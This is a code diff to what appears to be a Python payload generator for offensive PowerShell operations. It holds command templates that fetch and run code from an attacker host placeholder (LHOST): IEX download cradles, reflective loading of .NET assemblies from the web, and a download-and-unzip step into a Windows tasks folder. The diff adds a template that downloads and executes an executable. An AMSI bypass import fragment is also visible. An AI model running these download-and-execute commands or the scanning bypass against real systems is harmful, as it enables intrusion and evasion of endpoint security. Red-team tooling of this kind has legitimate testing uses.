@@ -24,6 +24,7 @@ PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}
 PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_class}]::{entrypoint}({cmd})'''
 PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
 PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
+PS_EXE_DL = "wget http://{LHOST}/{tool} -o t.exe;.\\t.exe {cmd}"
 
 AMSI_BYPASS_IMPORT = f"""
   // [DllImport("kernel32")]
@@ -567,5 +568,5 @@ def write_file(filename, content):
 
 def cs_compile(filename, flags=""):
   cmd = f"mcs {flags} {filename}"
+  print("Compiling source file " + filename)
   os.system(cmd)
-  print("Compiled " + filename)
